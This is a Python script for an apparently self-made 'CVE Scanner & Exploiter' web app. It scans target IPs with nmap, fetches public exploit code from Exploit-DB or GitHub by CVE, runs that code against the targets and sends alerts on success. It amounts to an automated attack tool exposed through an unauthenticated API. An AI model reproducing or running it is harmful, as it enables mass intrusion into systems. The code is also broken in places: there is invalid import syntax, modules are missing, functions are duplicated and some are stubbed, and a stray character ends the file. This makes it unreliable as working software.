import os, sys, threading, requests, json, gzip, subprocess, smtplib, time, tempfile, shutil
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import nmap from nmap
# ------------- Config -------------
CONFIG = {
    "targets": ["192.168.1.10"],

    "email": {
        "enabled": True,
        "smtp_server": "smtp.gmail.com",
        "smtp_port": 587,
        "username": "your_email@gmail.com",
        "password": "your_app_password",
        "from_addr": "your_email@gmail.com",
        "to_addrs": ["alert_receiver@example.com"]
    },

    "discord": {
        "enabled": True,
        "webhook_url": "https://discord.com/api/webhooks/your_webhook_here"
    },

    "nvd_bulk_url": "https://nvd.nist.gov/feeds/json/cve/1.1/nvdcve-1.1-recent.json.gz",

    "log_file": "exploit_log.json",
    "github_token": None,  # nếu có thì điền token GitHub ở đây
}
log_data = []

# ------------ Docker runner -------------
def run_in_docker(filename, target):
    folder = os.path.abspath(os.path.dirname(filename))
    basefile = os.path.basename(filename)
    ext = os.path.splitext(basefile)[1].lower()
    # Các lệnh tương ứng từng ngôn ngữ
    if ext in [".py"]:
        cmd = ["python3", basefile, target]
    elif ext in [".sh"]:
        cmd = ["bash", basefile, target]
    elif ext in [".pl"]:
        cmd = ["perl", basefile, target]
    elif ext in [".php"]:
        cmd = ["php", basefile, target]
    elif ext in [".rb"]:
        cmd = ["ruby", basefile, target]
    elif ext in [".js"]:
        cmd = ["node", basefile, target]
    elif ext in [".ps1"]:
        cmd = ["powershell", "-File", basefile, target]
    elif ext in [".bat"]:
        cmd = [basefile, target]  # chỉ chạy trên Windows Docker image
    elif ext in [".jar"]:
        cmd = ["java", "-jar", basefile, target]
    else:
        print(f"[!] Unsupported exploit file extension {ext}")
        return ""

    docker_cmd = [
        "docker", "run", "--rm",
        "-v", f"{folder}:/exploits",
        "-w", "/exploits",
        "exploit-runner"
    ] + cmd
    try:
        result = subprocess.run(docker_cmd, capture_output=True, text=True, timeout=300)
        return result.stdout + result.stderr
    except Exception as e:
        print(f"[!] Error running exploit in docker: {e}")
        return ""

# ------------- Email alert -------------
def send_email(subject, body):
    if not CONFIG["email"]["enabled"]:
        return
    try:
        import smtplib
        from email.mime.text import MIMEText
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = CONFIG["email"]["from_addr"]
        msg['To'] = ", ".join(CONFIG["email"]["to_addrs"])

        server = smtplib.SMTP(CONFIG["email"]["smtp_server"], CONFIG["email"]["smtp_port"])
        server.starttls()
        server.login(CONFIG["email"]["username"], CONFIG["email"]["password"])
        server.sendmail(CONFIG["email"]["from_addr"], CONFIG["email"]["to_addrs"], msg.as_string())
        server.quit()
        print("[i] Email alert sent.")
    except Exception as e:
        print(f"[!] Email send error: {e}")

# ------------- Discord alert -------------
def send_discord(message):
    if not CONFIG["discord"]["enabled"]:
        return
    url = CONFIG["discord"]["webhook_url"]
    try:
        r = requests.post(url, json={"content": message})
        if r.status_code == 204:
            print("[i] Discord alert sent.")
        else:
            print(f"[!] Discord webhook error: {r.status_code}")
    except Exception as e:
        print(f"[!] Discord send error: {e}")

def send_alert(cve, output):
    message = f"Exploit successful for {cve}:\n```\n{output[:1000]}\n```"
    send_email(f"[ALERT] Exploit success: {cve}", output)
    send_discord(message)

# ------------- NVD data download and parse -------------
def download_nvd_bulk():
    url = CONFIG["nvd_bulk_url"]
    print("[i] Downloading NVD data from", url)
    try:
        r = requests.get(url, timeout=60)
        if r.status_code == 200:
            with open("nvd_data.json.gz", "wb") as f:
                f.write(r.content)
            with gzip.open("nvd_data.json.gz", 'rb') as f_in:
                with open("nvd_data.json", "wb") as f_out:
                    f_out.write(f_in.read())
            print("[i] NVD data saved to nvd_data.json")
            return True
        else:
            print("[!] Failed to download NVD data:", r.status_code)
            return False
    except Exception as e:
        print("[!] Exception downloading NVD data:", e)
        return False

def parse_nvd_cve_description(nvd_file, cve_id):
    try:
        with open(nvd_file) as f:
            data = json.load(f)
        for item in data.get("CVE_Items", []):
            if item["cve"]["CVE_data_meta"]["ID"] == cve_id:
                descs = item["cve"]["description"]["description_data"]
                if descs:
                    return descs[0]["value"]
    except Exception as e:
        print("[!] Parse NVD CVE error:", e)
    return ""

# ------------- Detect OS from CVE description (đơn giản) -------------
def detect_os_from_description(desc):
    desc = desc.lower()
    if "windows" in desc:
        return "Windows"
    if "linux" in desc:
        return "Linux"
    if "unix" in desc:
        return "Unix"
    if "mac os" in desc or "macos" in desc:
        return "MacOS"
    return "Unknown"

# ------------- Exploit-DB search & download -------------
def search_exploitdb(cve_id):
    try:
        url = f"https://www.exploit-db.com/search?cve={cve_id}"
        r = requests.get(url)
        if r.status_code == 200:
            # đơn giản lấy id exploit đầu tiên
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(r.text, "html.parser")
            table = soup.find("table", {"id":"exploits-table"})
            if table:
                first = table.find("tbody").find("tr")
                if first:
                    exploit_id = first.get("data-id")
                    title = first.find("td", {"class":"description"}).text.strip()
                    return exploit_id, title
    except Exception as e:
        print("[!] Exploit-DB search error:", e)
    return None, None

def download_exploitdb_code(exploit_id):
    if not exploit_id:
        return None
    try:
        url = f"https://www.exploit-db.com/download/{exploit_id}"
        r = requests.get(url)
        if r.status_code == 200:
            fname = f"exploit_{exploit_id}"
            ext = r.headers.get('Content-Disposition')
            if ext and "." in ext:
                ext = ext.split('.')[-1].replace('"','').strip()
                fname += "." + ext
            else:
                fname += ".txt"
            with open(fname, "wb") as f:
                f.write(r.content)
            print(f"[i] Exploit code saved: {fname}")
            return fname
    except Exception as e:
        print("[!] Download exploit-db code error:", e)
    return None

# ------------- GitHub search exploit fallback -------------
def github_search_exploit(cve_id):
    if not CONFIG["github_token"]:
        return None, None
    from github import Github
    g = Github(CONFIG["github_token"])
    try:
        query = f"{cve_id} exploit"
        result = g.search_code(query, order="desc")
        for file in result:
            if file.download_url and any(file.download_url.endswith(x) for x in [".py", ".sh", ".pl", ".php", ".rb", ".js"]):
                return file.download_url, file.html_url
    except Exception as e:
        print("[!] GitHub search error:", e)
    return None, None

def download_github_code(url):
    try:
        r = requests.get(url)
        if r.status_code == 200:
            fname = url.split("/")[-1]
            with open(fname, "wb") as f:
                f.write(r.content)
            print(f"[i] GitHub exploit downloaded: {fname}")
            return fname
    except Exception as e:
        print("[!] Download GitHub code error:", e)
    return None

# ------------- Execute exploit -------------
def execute_exploit(filename, target):
    print(f"[i] Running exploit {filename} on target {target}")
    return run_in_docker(filename, target)

# ------------- Save logs -------------
def save_log():
    with open(CONFIG["log_file"], "w", encoding="utf-8") as f:
        json.dump(log_data, f, indent=2)
    print(f"[i] Log saved to {CONFIG['log_file']}")

def save_html_report():
    html = """
<html><head><title>Exploit Scan Report</title>
<style>body{font-family:Arial; margin:20px;} table{border-collapse: collapse; width: 100%;} th, td{border:1px solid #ddd; padding:8px;} th{background:#f2f2f2;}</style>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
</head><body><h1>Exploit Scan Report</h1>
"""
    html += f"<p>Report generated at: {datetime.now()}</p>"
    html += "<table><thead><tr><th>CVE ID</th><th>OS</th><th>Source</th><th>Target</th><th>Status</th></tr></thead><tbody>"
    success = 0
    fail = 0
    for entry in log_data:
        status = entry.get("status", "unknown")
        if status == "success":
            success += 1
        elif status == "fail":
            fail += 1
        html += f"<tr><td>{entry.get('cve')}</td><td>{entry.get('os')}</td><td>{entry.get('source')}</td><td>{entry.get('target')}</td><td>{status}</td></tr>"
    html += "</tbody></table>"

    html += """
    <canvas id="resultChart" width="400" height="200"></canvas>
    <script>
    const ctx = document.getElementById('resultChart').getContext('2d');
    const chart = new Chart(ctx, {
        type: 'pie',
        data: {
            labels: ['Success', 'Fail', 'Unknown'],
            datasets: [{
                label: 'Exploit Results',
                data: [%d, %d, %d],
                backgroundColor: ['#4caf50', '#f44336', '#9e9e9e']
            }]
        }
    });
    </script></body></html>
    """ % (success, fail, max(0, len(log_data) - success - fail))

    with open("exploit_report.html", "w", encoding="utf-8") as f:
        f.write(html)
    print("[i] HTML report saved as exploit_report.html")

# ------------- Main Exploit CVE flow -------------
def exploit_cve(cve_id):
    print(f"\n=== Processing {cve_id} ===")

    # Download NVD bulk if missing
    if not os.path.isfile("nvd_data.json"):
        if not download_nvd_bulk():
            print("[!] Cannot proceed without NVD data")
            return

    desc = parse_nvd_cve_description("nvd_data.json", cve_id)
    os_detected = detect_os_from_description(desc)
    print(f"[i] Detected OS: {os_detected}")
    print(f"[i] Description: {desc[:150]}...")

    # Search exploit-db
    exploit_id, title = search_exploitdb(cve_id)
    source = "Exploit-DB"
    filename = None
    if exploit_id:
        filename = download_exploitdb_code(exploit_id)
    else:
        # fallback github
        print("[i] Searching on GitHub...")
        dl_url, gh_url = github_search_exploit(cve_id)
        source = "GitHub"
        if dl_url:
            filename = download_github_code(dl_url)

    if not filename:
        print(f"[-] No exploit found for {cve_id}")
        log_data.append({"cve": cve_id, "os": os_detected, "source": "None", "target": "N/A", "status": "fail"})
        return

    for target in CONFIG["targets"]:
        output = execute_exploit(filename, target)
        status = "success" if output.strip() else "fail"
        log_data.append({
            "cve": cve_id,
            "os": os_detected,
            "source": source,
            "target": target,
            "status": status,
            "output": output
        })
        if status == "success":
            send_alert(cve_id, output)

def scan_cve_list(cve_list):
    threads = []
    for cve in cve_list:
        t = threading.Thread(target=exploit_cve, args=(cve,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

app = Flask(__name__)

# ======================
# Banner và màu đổi liên tục
# ======================
BANNER_TEXT = "YURI08loveELAINA"
BANNER_COLORS = ["red", "green", "yellow", "blue", "magenta", "cyan"]

def get_colored_banner():
    color = random.choice(BANNER_COLORS)
    return f'<span style="color:{color}; font-weight:bold;">{BANNER_TEXT}</span>'

# ======================
# ML simple phân tích output exploit
# ======================
def ml_predict_success(exploit_output: str) -> bool:
    keywords_success = ["success", "exploit done", "shell spawned", "access granted"]
    keywords_fail = ["error", "fail", "denied", "not vulnerable"]
    output_lower = exploit_output.lower()
    score = sum(k in output_lower for k in keywords_success) - sum(k in output_lower for k in keywords_fail)
    return score > 0

# ======================
# Tích hợp Nmap scan lấy CVE từ script vuln
# ======================
def nmap_scan(target_ip):
    nm = nmap.PortScanner()
    nm.scan(target_ip, arguments='-sV --script vuln')
    cves_found = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            for port in nm[host][proto]:
                scripts = nm[host][proto][port].get('script', {})
                for output in scripts.values():
                    cves_found.extend(re.findall(r'CVE-\d{4}-\d{4,7}', output))
    return list(set(cves_found))

# ======================
# Lấy exploit từ Exploit-DB (demo giả lập)
# Nếu không có, fallback tìm từ GitHub (demo giả lập)
# ======================
def fetch_exploit_code(cve_id):
    # Giả lập: nếu CVE có số chẵn thì có exploit-db, số lẻ thì phải lấy github
    if int(cve_id.split('-')[-1]) % 2 == 0:
        return f"# Exploit code from Exploit-DB for {cve_id}\necho 'Exploit {cve_id} running...'\nexit 0"
    else:
        return f"# Exploit code fallback from GitHub for {cve_id}\necho 'GitHub Exploit {cve_id} running...'\nexit 0"

# ======================
# Chạy exploit trong sandbox Docker (demo giả lập, bạn cần có Docker setup thực tế)
# ======================
def run_exploit_in_docker(exploit_code, target):
    # Lưu exploit tạm thời
    filename = f"/tmp/exploit_{random.randint(1000,9999)}.sh"
    with open(filename, "w") as f:
        f.write(exploit_code)
    os.chmod(filename, 0o755)

    # Giả lập chạy exploit trên target, thật ra bạn chạy docker container và mount file này vào
    proc = subprocess.run([filename, target], capture_output=True, text=True, timeout=20)
    output = proc.stdout + proc.stderr
    success = ml_predict_success(output)
    os.remove(filename)
    return success, output

# ======================
# Scan & Exploit multi-threaded
# ======================
def scan_and_exploit(cves, targets):
    results = []
    for target in targets:
        # Tự động lấy CVE nếu input target mà cves trống (từ nmap)
        if not cves:
            cves = nmap_scan(target)
        for cve in cves:
            exploit_code = fetch_exploit_code(cve)
            success, output = run_exploit_in_docker(exploit_code, target)
            results.append({
                "target": target,
                "cve": cve,
                "success": success,
                "output": output,
                "timestamp": datetime.now().isoformat()
            })
            # Gửi alert nếu thành công (demo chỉ print)
            if success:
                print(f"[ALERT] Exploit succeeded on {target} - {cve}")
    return results

# ======================
# API RESTful mở rộng
# ======================
@app.route('/api/v1/scan', methods=['POST'])
def api_scan():
    data = request.json
    cves = data.get("cves", [])
    targets = data.get("targets", [])
    if not targets:
        return jsonify({"error": "No targets specified"}), 400
    results = scan_and_exploit(cves, targets)
    # Lưu log kết quả
    with open("scan_log.json", "w") as f:
        json.dump(results, f, indent=2)
    return jsonify({"results": results})

@app.route('/api/v1/alerts', methods=['POST'])
def api_alert():
    alert = request.json
    print("Received alert:", alert)
    return jsonify({"status": "ok"})

# ======================
# Web UI + Dashboard + Banner + Background + Footer
# ======================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>YURI08 CVE Scanner & Exploiter</title>
<style>
  body {
    background: url('https://i.imgur.com/wlHjQyD.jpg') no-repeat center center fixed;
    background-size: cover;
    color: white;
    font-family: Arial, sans-serif;
    margin: 0; padding: 0;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  header {
    padding: 1rem;
    font-size: 2rem;
    font-weight: bold;
    text-align: center;
  }
  #banner { font-weight: bold; }
  main {
    flex-grow: 1;
    padding: 1rem;
    background-color: rgba(0,0,0,0.5);
  }
  footer {
    text-align: center;
    padding: 0.5rem;
    background-color: rgba(0,0,0,0.7);
    font-size: 0.9rem;
  }
  button {
    background: #4CAF50;
    border: none;
    padding: 0.6rem 1.2rem;
    color: white;
    cursor: pointer;
    font-size: 1rem;
    margin-top: 1rem;
  }
  table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 1rem;
  }
  th, td {
    border: 1px solid white;
    padding: 0.5rem;
    text-align: left;
  }
  th {
    background: rgba(255,255,255,0.2);
  }
</style>
<script>
async function startScan() {
  const cvesInput = document.getElementById('cves').value;
  const targetsInput = document.getElementById('targets').value;
  const cves = cvesInput.split(',').map(s => s.trim()).filter(Boolean);
  const targets = targetsInput.split(',').map(s => s.trim()).filter(Boolean);
  if(targets.length === 0) {
    alert("Please input at least one target IP/domain.");
    return;
  }
  document.getElementById('results').innerHTML = 'Scanning... Please wait.';
  const resp = await fetch('/api/v1/scan', {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({cves, targets})
  });
  const data = await resp.json();
  if(data.error) {
    document.getElementById('results').innerText = data.error;
    return;
  }
  let html = '<table><tr><th>Target</th><th>CVE</th><th>Success</th><th>Output</th><th>Timestamp</th></tr>';
  data.results.forEach(r => {
    html += `<tr>
      <td>${r.target}</td>
      <td>${r.cve}</td>
      <td style="color:${r.success ? 'lightgreen':'red'}">${r.success}</td>
      <td><pre style="white-space: pre-wrap; max-height:100px; overflow:auto;">${r.output}</pre></td>
      <td>${r.timestamp}</td>
    </tr>`;
  });
  html += '</table>';
  document.getElementById('results').innerHTML = html;
}

// Đổi màu banner liên tục
function changeBannerColor() {
  const colors = ["red","green","yellow","blue","magenta","cyan"];
  const banner = document.getElementById('banner');
  const color = colors[Math.floor(Math.random() * colors.length)];
  banner.style.color = color;
}
setInterval(changeBannerColor, 700);
</script>
</head>
<body>
<header><div id="banner">{{ banner|safe }}</div></header>
<main>
  <h2>Scan & Exploit CVE</h2>
  <label for="cves">CVE IDs (comma separated, empty = auto from target):</label><br>
  <input type="text" id="cves" style="width: 100%;" placeholder="e.g. CVE-2021-44228,CVE-2019-0708" /><br><br>
  <label for="targets">Target IPs/Domains (comma separated):</label><br>
  <input type="text" id="targets" style="width: 100%;" placeholder="e.g. 192.168.1.5,example.com" /><br>
  <button onclick="startScan()">Start Scan & Exploit</button>
  <div id="results" style="margin-top:1rem;"></div>
</main>
<footer>coding by YURI08</footer>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, banner=get_colored_banner())

# ======================
# Main chạy Flask
# ======================
if __name__ == '__main__':
    print(get_colored_banner())
    app.run(host='0.0.0.0', port=5000)


h
